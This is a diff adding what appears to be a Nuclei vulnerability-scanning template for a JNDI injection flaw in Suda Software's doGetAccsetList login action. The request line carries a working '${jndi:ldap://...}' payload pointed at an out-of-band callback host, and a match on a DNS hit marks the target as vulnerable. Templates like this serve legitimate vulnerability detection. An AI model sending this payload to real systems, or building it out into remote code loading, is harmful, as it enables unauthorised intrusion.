@@ -1,0 +1,23 @@
+id: poc-yaml-suda-software-dogetaccsetlist-jnidi
+info:
+  name: 速达软件 doGetAccsetList JNID注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ldap-injection
+
+dns:
+  - name: "{{interactsh-url}}"
+    type: A
+
+http:
+  - raw:
+      - |
+        GET /login/login!doGetAccsetList.action?report=${jndi:ldap://{{interactsh-url}}} HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
